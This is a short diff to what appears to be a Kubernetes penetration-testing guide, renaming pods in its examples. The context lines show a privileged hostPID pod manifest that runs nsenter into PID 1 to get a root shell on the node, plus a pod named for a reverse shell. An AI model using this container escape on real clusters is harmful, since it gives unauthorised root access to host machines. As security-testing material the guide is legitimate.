@@ -12,13 +12,13 @@ One promising privesc path is available if you can schedule your pod to run on t
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-priv-and-hostpid
+  name: priv-and-hostpid-exec-pod
   labels: 
     app: pentest
 spec:
   hostPID: true
   containers:
-  - name: priv-and-hostpid
+  - name: priv-and-hostpid-exec-pod
     image: ubuntu
     command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]
     tty: true
@@ -52,7 +52,7 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-everything-allowed-revshell
+  name: everything-allowed-revshell
   labels:
     app: pentest
 spec:
